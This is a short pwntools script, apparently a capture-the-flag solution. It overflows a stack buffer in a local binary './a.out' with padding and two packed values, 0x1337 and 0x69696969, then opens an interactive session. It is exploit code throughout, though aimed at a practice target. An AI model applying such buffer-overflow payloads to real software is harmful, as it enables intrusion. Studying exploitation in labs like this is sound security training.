from pwn import *
p=process("./a.out")
payload = b"A"*(0x110 - 0x8) + p32(0x1337) + p32(0x69696969)
p.sendline(payload)
p.interactive()
